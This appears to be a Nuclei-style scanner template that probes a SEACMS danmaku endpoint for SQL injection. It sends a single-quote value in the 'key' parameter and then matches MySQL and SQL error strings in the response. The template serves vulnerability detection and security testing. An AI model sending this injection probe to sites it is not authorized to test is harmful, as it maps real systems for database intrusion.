id: seaCMS-sqli

info:
  name: SEACMS dmku_index file SQLI
  author: Str1am
  severity: high
  tags: seaCMS,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/js/player/dmplayer/dmku/index.php?ac=so&key=1%27"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        condition: or
        words:
          - "You have an error in your SQL syntax"
          - "supplied argument is not a valid MySQL"
          - "mysql_fetch_array()"
          - "mysqli_fetch"
          - "Warning: mysql_"
          - "Unclosed quotation mark"
          - "quoted string not properly terminated"
        # Trigger an actual syntax error with a single-quote; generic JSON fields
        # ("code","count","data") appear on any API and cause false positives
